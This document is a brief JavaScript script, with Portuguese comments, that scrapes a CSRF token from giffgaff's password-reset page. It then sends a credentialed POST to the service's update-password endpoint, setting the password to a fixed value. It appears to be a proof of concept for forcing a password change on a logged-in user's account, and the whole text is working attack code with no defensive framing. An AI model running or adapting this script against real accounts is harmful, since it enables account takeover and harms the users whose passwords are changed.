fetch("https://www.giffgaff.com/auth/reset/password")
  .then(res => res.text())
  .then(html => {
    const match = html.match(/"token"\s*:\s*"([^"]+)"/);
    if (!match || !match[1]) {
      alert("Token não encontrado");
      return;
    }

    const token = match[1];
    console.log("Token encontrado:", token);

    // Envia a requisição POST com o token
    fetch("https://id.giffgaff.com/auth/v1/update-password", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-CSRF-TOKEN": token
      },
      body: JSON.stringify({
        password: "testando123!@"
      }),
      credentials: "include" // Importante se estiver logado e precisa de cookies
    })
    .then(res => res.text())
    .then(result => {
      console.log("Resposta da atualização de senha:", result);
      alert("Feito! Veja console.");
    })
    .catch(err => {
      console.error("Erro na requisição:", err);
      alert("Erro na requisição.");
    });
  });
